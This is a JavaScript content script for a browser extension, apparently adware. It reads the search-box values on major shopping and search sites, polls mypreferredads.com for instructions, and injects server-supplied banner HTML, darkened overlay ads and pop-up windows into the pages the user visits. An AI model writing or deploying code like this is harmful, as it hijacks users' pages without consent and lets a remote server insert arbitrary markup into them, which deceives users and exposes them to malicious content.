var contact;
var nourl;

var inputClassName = 'sw_qbox|s_ipt|queryInput|ac_input|sbq|searchBox|csbs|afi';
var inputIdName = 'twotabsearchtextbox|sb_form_q|kw|searchfor|top_q_comm|gbqfq|sbhost|yschsp|aol_header_query|csbquery1|gh-ac|_nkw_id|_fsb_nkw';
var formClassName = 'nav-searchbar-inner|sw_box|fm|enable-suggestion|gbes|search|search-3|fsbC|lftd|l-shad';
var formIdName = 'sb_form|headerSearch|topform|gbqf|sf|aol-header-search|csbform|gh-f|v4-3|fsb';

chrome.extension.onRequest.addListener(function(request) {
   if (request === "executeScript") 
   {   
		RunScript();
   }
});

var App = {
   resize: function() {
  
		RunScript();
   }
};

chrome.extension.onRequest.addListener(function(request) {
   if (request === "resize") 
   {
   
      App.resize();
   }
});

function IsJsonString(str){try{var nativeJSON1 = JSON.parse(str);}catch(e){return false;} return true;}


function RunScript()
{
	var oDocument = document;
	var iAry = oDocument.getElementsByTagName('input');
	var iFrmAry = oDocument.getElementsByTagName('form');

	var inputClassNameAry = inputClassName.split('|');
	var inputIdAry = inputIdName.split('|');
	var InputClassAryLength = iAry.length;
	var InputIdAryLength = iAry.length;

	var FormClassAry = formClassName.split('|');
	var FormIdAry = formIdName.split('|');
	var FormClassAryLength = iFrmAry.length;
	var FormIdAryLength = iFrmAry.length;

	var SearchText = '';

	var iS = 0;
	var iT = 0;
	var iU = 0;
	var taskDone = 0;
	if( taskDone == 0   &&  InputClassAryLength > 0 )
	{
		for(iT=0;iT<inputClassNameAry.length;iT++)
		{
			for(iS=0;iS<InputClassAryLength;iS++)
			{
				tempclass = inputClassNameAry[iT].replace(/^\s+/,'');
				tempclass = tempclass.replace(/\s+$/,'');
				if(iAry[iS].className == tempclass)
				{
					SearchText = iAry[iS].value;
					
					taskDone++;
				}
			}
		}
		if(taskDone == 0 && InputIdAryLength > 0)
		{
			for(iT=0;iT<inputIdAry.length;iT++)
			{
				for(iS=0;iS<InputIdAryLength;iS++)
				{
					tempid = inputIdAry[iT].replace(/^\s+/,'');
					tempid = tempid.replace(/\s+$/,'');
					if(iAry[iS].id == tempid)
					{
						SearchText = iAry[iS].value;
						
						taskDone++;
					}
				}
			}
		}
	}

	var insideFormInputs;
	if( taskDone == 0   &&  FormClassAryLength > 0 )
	{
		for(iT=0;iT<FormClassAry.length;iT++)
		{
			for(iS=0;iS<iFrmAry.length; iS++)
			{
				tempclass = FormClassAry[iT].replace(/^\s+/,'');
				tempclass = tempclass.replace(/\s+$/,'');
				if(FormClassAry[iT] == iFrmAry[iS].className)
				{
					insideFormInputs = iFrmAry[iS].getElementsByTagName('input');
					for(iU=0;iU<insideFormInputs.length;iU++)
					{
						if(((insideFormInputs[iU].type).toLowerCase()) == 'text' && insideFormInputs[iU].value != '')
						{
							SearchText = insideFormInputs[iU].value;
							taskDone++;
						}
					}
				}
			}
		}
	}
	
	if( taskDone == 0   &&  FormIdAryLength > 0 )
	{
		for(iT=0;iT<FormIdAry.length;iT++)
		{
			for(iS=0;iS<iFrmAry.length; iS++)
			{
				tempid = FormIdAry[iT].replace(/^\s+/,'');
				tempid = tempid.replace(/\s+$/,'');
				if(FormIdAry[iT] == iFrmAry[iS].id)
				{
					insideFormInputs = iFrmAry[iS].getElementsByTagName('input');
					for(iU=0;iU<insideFormInputs.length;iU++)
					{
						if(((insideFormInputs[iU].type).toLowerCase()) == 'text' && insideFormInputs[iU].value != '')
						{
							SearchText = insideFormInputs[iU].value;
							taskDone++;
						}
					}
				}
			}
		}
	}
	if((SearchText != '')||(SearchText == ''))
	{
		var CurrLoc = oDocument.location.host;
		CurrLoc = encodeURI(CurrLoc);
		var APIResponse = '';
		var SearchTextLocal = '';

		var url= "http://mypreferredads.com/marshal/index.php/api/getdetails?data={%22id%22:%221%22}";
		
		var req = new XMLHttpRequest();
		req.open('GET', url , true);
		req.onreadystatechange = function (aEvt) {
			if (req.readyState == 4) 
			{
			   contact = JSON.parse(req.responseText);
			   APIResponse = req.responseText;
				SearchTextLocal = SearchText;
				nourl = req.responseText;
				
             if(contact.data.banner_injection_status== "true")
			{
			 BanerInjection();	
			}
			
			 if(contact.data.popupOverlay_status== "true")
			 {
			 PopupOverlay();
			 }
			if(contact.data.popup_status== "true")
			 {
			 popup();
			 }	
		}
		};
		req.send(null);
	}
}

RunScript();

function popup()
{
   var res22 = nourl.match(/banner/g).length;
   
					for (var i=1;i<=res22;i++)
					{
					var CurrHost = window.location.href;
					var getpatch_url = contact.data.keywordlist['patch_url'+i];
					var geturl = contact.data.keywordlist['keyword'+i];
		 if(CurrHost.indexOf(geturl)>-1)
		{
			var myWindow = window.open("", "MsgWindow", "width=1340, height=650");
			myWindow.location.replace("http://"+getpatch_url);
		}
		}
}
function PopupOverlay()
{
 var CurrHost;
     CurrHost = window.location.href;
	 
    var oDocument = document;
    var tads = oDocument.getElementsByTagName("BODY")[0];
	var overlayElement = oDocument.createElement('div');
		overlayElement.setAttribute('id','overlay');
		overlayElement.setAttribute("style","background:#000;opacity:0.7;width:100%;height:100%;left: 0;top: 0;z-index: 9999999;position: fixed;");
    var addedElement = oDocument.createElement("div");
    addedElement.setAttribute('id','topGTAds');
  addedElement.setAttribute("style","position: fixed; z-index: 99999999; background: none repeat scroll 0% 0% white; top: 30%; margin-top: -100px; margin-left: -100px; left: 30%;");
	 var aE1 = oDocument.createElement("div");
    aE1.setAttribute('id','bottomGTAds');
 
           var inturl =  nourl.indexOf("popupoverlaylist");
		 var stres = nourl.substr(inturl);
		   
			     var count =  stres.split("click_url").length-1 ; 
					
					             for(var i=1; i<count+1; i++)
								{ 
								var strmanipul = contact.data.popupoverlaylist['url'+i];
	                        var strbanner = contact.data.popupoverlaylist['banner'+i];
								var clickUrl =contact.data.popupoverlaylist['click_url'+i];
								//alert(strbanner);
								var get1 = strmanipul.indexOf("w.");
								var get2 = strmanipul.lastIndexOf(".");
	                            var res = strmanipul.substring(get1+2,get2);
	                     // alert(res);
								if(CurrHost.indexOf(res)>-1)
								{
			
				       addedElement.innerHTML = '<body><span style="float:right; cursor:pointer;" onclick="getElementById(\'topGTAds\').remove();getElementById(\'overlay\').remove();" >X</span><center><a href="http://'+clickUrl+'" target="blank"><img src="'+strbanner+'" border="0" height="100%" width="100%"/></a></center>'; 
					   
					    tads.appendChild(overlayElement);
			         	tads.parentNode.insertBefore(addedElement,tads); 
				        var body = oDocument.getElementsByTagName("*")[0];
				            body.appendChild(addedElement);
								}
								}
}


function BanerInjection()
{
    var CurrHost;
     CurrHost = window.location.href;
	 
    var oDocument = document;
    var tads = oDocument.getElementsByTagName("BODY")[0];
    var addedElement = oDocument.createElement("div");
    addedElement.setAttribute('id','topGTAds');
  // addedElement.setAttribute("style","-webkit-transform: rotate(90deg);position:absolute;z-index:99999999;top:50%");
	 var aE1 = oDocument.createElement("div");
    aE1.setAttribute('id','bottomGTAds');
 

			     var count =  nourl.split("header").length-1 ; 
					
					             for(var i=1; i<count+1; i++)
								{ 
								var strmanipul = contact.data.bannerlist['url'+i];
	
								var get1 = strmanipul.indexOf("w.");
								var get2 = strmanipul.lastIndexOf(".");
	                            var res = strmanipul.substring(get1+2,get2);
	                       
								if(CurrHost.indexOf(res)>-1)
								{
								 geturl = contact.data.bannerlist['url'+i];
                                  getheaderads = contact.data.bannerlist['header'+i];								
					             getfooterads = contact.data.bannerlist['footer'+i];
								
					             addedElement.innerHTML=getheaderads;
                                 tads.parentNode.insertBefore(addedElement,tads); 
                                 var body = oDocument.getElementsByTagName("*")[0];
					             aE1.innerHTML = getfooterads;
                                  body.appendChild(aE1);
								}
								}

}
